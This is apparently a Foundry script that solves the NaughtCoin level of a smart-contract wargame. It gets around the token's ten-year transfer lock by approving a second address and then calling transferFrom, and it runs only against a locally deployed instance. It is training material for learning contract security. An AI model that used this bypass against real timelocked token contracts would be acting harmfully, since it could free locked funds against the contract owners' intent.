// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {NaughtCoin} from "../src/NaughtCoin.sol";

contract NaughtCoinSolution is Script {
    // $ forge script script/NaughtCoin.s.sol --tc NaughtCoinSolution

    NaughtCoin coinInstance;

    function run() external {
        address player = makeAddr("player");
        address playerAnotherAddress = makeAddr("playerAnotherAddress");
        vm.startPrank(player);
        coinInstance = new NaughtCoin(player);

        // - The token contract disallow the player from transfereing his money manually, before passing 10 years.
        // - But our token inherits from OpenZeppelin ERC20 contract, and ERC-20 has an `approve()` method that allows transferring tokens from non-users.
        // - We will approve another address for our tokens, and then we will make this address transfer the tokens to himself.
        // - By doing these steps, the player balance will be zero, and the tokens will be with the second address.

        uint256 playerBalance = coinInstance.balanceOf(player);

        console.log("Player balance:", coinInstance.balanceOf(player));

        coinInstance.approve(playerAnotherAddress, playerBalance);
        vm.stopPrank();

        vm.startPrank(playerAnotherAddress);
        coinInstance.transferFrom(player, playerAnotherAddress, playerBalance);

        console.log("Player balance:", coinInstance.balanceOf(player));
        vm.stopPrank();
        // -----------------
    }
}
